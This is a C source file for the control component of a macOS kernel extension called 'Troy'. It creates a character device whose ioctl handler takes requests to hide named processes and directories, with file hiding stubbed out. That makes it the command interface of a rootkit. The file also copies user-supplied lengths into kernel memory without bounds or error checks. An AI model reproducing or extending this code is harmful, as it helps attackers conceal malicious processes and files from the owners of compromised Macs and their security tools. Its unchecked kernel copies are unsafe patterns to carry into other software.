//
//  Control.c
//  Troy
//
//  Created by Axis on 5/7/15.
//  Copyright (c) 2015 Axis. All rights reserved.
//

#include <string.h>
#include <sys/proc.h>
#include <sys/errno.h>
#include <libkern/libkern.h>
#include <mach/mach_types.h>
#include <kern/kern_types.h>
#include <miscfs/devfs/devfs.h>

#include "Control.h"
#include "configure.h"
#include "debugInfo.h"
#include "HookCAPI.h"

errno_t init_troy_components();
int troy_open_fn(dev_t dev, int flags, int devtype, struct proc *p);
int troy_close_fn(dev_t dev, int flags, int devtype, struct proc *p);
int  troy_ioctl_fn(dev_t dev, u_long cmd, caddr_t data, int fflag, struct proc *p);

static int g_dev_major=-1;
static void *g_fs_mac_dev=NULL;

struct cdevsw troy_fops= {
    .d_open=troy_open_fn,		// open_close_fcn_t
    .d_close=troy_close_fn,		// open_close_fcn_t
    .d_read=nullread,           // read_write_fcn_t
    .d_write=nullwrite,         // read_write_fcn_t
    .d_ioctl=troy_ioctl_fn,		// ioctl_fcn_t
    .d_stop=nullstop,           // stop_fcn_t
    .d_reset=nullreset,         // reset_fcn_t
    .d_ttys=0,                  // struct tty
    .d_select=eno_select,		// select_fcn_t
    .d_mmap=eno_mmap,           // mmap_fcn_t
    .d_strategy=eno_strat,		// strategy_fcn_t
    .d_reserved_1=eno_getc,		// getc_fcn_t
    .d_reserved_2=eno_putc,		// putc_fcn_t
    .d_type=D_TTY,              // int
};

int troy_open_fn(dev_t dev, int flags, int devtype, struct proc *p)
{
    LOG(LOG_ERROR, "start _fn");
    return 0;
}

int troy_close_fn(dev_t dev, int flags, int devtype, struct proc *p)
{
    LOG(LOG_ERROR, "stop _fn");
    return 0;
}

int  troy_ioctl_fn(dev_t dev, u_long cmd, caddr_t data, int fflag, struct proc *p)
{
    switch (cmd) {
        case TROY_CMD_HIDE_FILE:
        {
            /*troy_hide_object *user_addr_file_obj = (troy_hide_object*)data;
            troy_hide_object *file_hide = _MALLOC(sizeof(troy_hide_object), M_TEMP, M_WAITOK);
            if(file_hide==NULL)
            {
                LOG(LOG_ERROR, "allocate memory for file_hide failed, QUIT");
                return TROY_ERROR_NOMEM;
            }*/

        }break;
        case TROY_CMD_HIDE_PROCESS:
        {
            troy_hide_object *user_addr_process_obj=(troy_hide_object*)data;
            troy_hide_object *process_hide = (troy_hide_object*)_MALLOC(sizeof(troy_hide_object),
                                                                        M_TEMP, M_WAITOK);
            if(process_hide==NULL)
            {
                LOG(LOG_ERROR, "malloc memory for process_hide failed, QUIT");
                return TROY_ERROR_NOMEM;
            }
            bzero(process_hide, sizeof(troy_hide_object));

            //get process name
            /////1. get length of process name
            uint64_t len = user_addr_process_obj->name_len;
            process_hide->name=(char*)_MALLOC((len+1)*sizeof(char), M_TEMP, M_WAITOK);
            if(process_hide->name==NULL)
            {
                LOG(LOG_ERROR, "malloc process name's memory failed");
                return TROY_ERROR_NOMEM;
            }
            /////2. exchange process name from user space to kernel space
            copyin(CAST_USER_ADDR_T(user_addr_process_obj->name), process_hide->name, (len+1)*sizeof(char));
            LOG(LOG_DEBUG, "process name is %s, %p", process_hide->name, user_addr_process_obj->name);

            /////3. set hide type
            process_hide->objec_type=user_addr_process_obj->objec_type;

            ////4 set length
            process_hide->name_len=user_addr_process_obj->name_len;

            errno_t return_code = hide_given_process(process_hide);
            if(return_code!=TROY_SUCCESS)
            {
                LOG(LOG_ERROR, "hide process error, error code is %d", return_code);
                SAFE_FREE(process_hide->name);
                SAFE_FREE(process_hide);
                break;
            }
            LOG(LOG_DEBUG, "hide process successfully");
            SAFE_FREE(process_hide->name);
            SAFE_FREE(process_hide);
        }break;

        case TROY_CMD_HIDE_DIR:
        {
            troy_hide_object *user_addr_dirent_obj=(troy_hide_object*)data;
            troy_hide_object *dirent_hide = (troy_hide_object*)_MALLOC(sizeof(troy_hide_object), M_TEMP, M_WAITOK);
            if(dirent_hide==NULL)
            {
                LOG(LOG_ERROR, "allocate dirent_hide's memory failed");
                return TROY_ERROR_NOMEM;
            }

            bzero(dirent_hide, sizeof(troy_hide_object));

            //1.get dirent name
            uint64_t len = (user_addr_dirent_obj->name_len)+1;
            dirent_hide->name = (char*)_MALLOC(sizeof(char)*len, M_TEMP, M_WAITOK);
            if(dirent_hide->name==NULL) return TROY_ERROR_NOMEM;
            bzero(dirent_hide->name, len*sizeof(char));
            copyin(CAST_USER_ADDR_T(user_addr_dirent_obj->name), dirent_hide->name, sizeof(char)*(len-1));
            LOG(LOG_DEBUG, "dirent_hide->name=%s", dirent_hide->name);

            //2. type
            dirent_hide->objec_type=user_addr_dirent_obj->objec_type;
            LOG(LOG_DEBUG, "dirent_hide->objec_type=%d", dirent_hide->objec_type);

            //3. get len
            dirent_hide->name_len = strlen(dirent_hide->name);
            LOG(LOG_DEBUG, "dirent_hide->name_len=%llu", dirent_hide->name_len);

            int return_code = hide_given_directory(dirent_hide);
            if(return_code!=TROY_SUCCESS)
            {
                LOG(LOG_ERROR, "hide dirent failed.");
            }
            else
            {
                LOG(LOG_ERROR, "hide dirent successfully");
            }
            SAFE_FREE(dirent_hide->name);
            SAFE_FREE(dirent_hide);
        }break;

        default:
        {

        }
    }
    return 0;
}

//
errno_t init_troy_components()
{
    LOG(LOG_DEBUG, "Enter");
    g_dev_major = cdevsw_add(-1, &troy_fops);   //add file operation to the device file
    if(g_dev_major==-1)
    {
        LOG(LOG_ERROR, "create device file falied, g_dev_major=%d", g_dev_major);
        return KERN_FAILURE;
    }

    g_fs_mac_dev=devfs_make_node(makedev(g_dev_major, 0), DEVFS_CHAR, UID_ROOT,
                                 GID_KMEM, 0640, TROY_DEV_NAME);
    if(g_fs_mac_dev==NULL)
    {
        LOG(LOG_ERROR, "Failed to call devfs_make_node");
        return KERN_FAILURE;
    }
    LOG(LOG_DEBUG, "Leave");

    return KERN_SUCCESS;
}

errno_t destroy_troy_component()
{
    LOG(LOG_DEBUG, "Enter");
    int return_code = KERN_SUCCESS;

    if(g_fs_mac_dev!=NULL)
    {
        devfs_remove(g_fs_mac_dev);
        g_fs_mac_dev=NULL;
    }

    if(g_dev_major!=-1)
    {
        return_code=cdevsw_remove(g_dev_major, &troy_fops);
        if(return_code!=g_dev_major)
        {
            LOG(LOG_ERROR, "remove device failed, return code is %d", return_code);
            return_code = KERN_FAILURE;
        }
        else
        {
            return_code = KERN_SUCCESS;
        }
    }
    return return_code;
}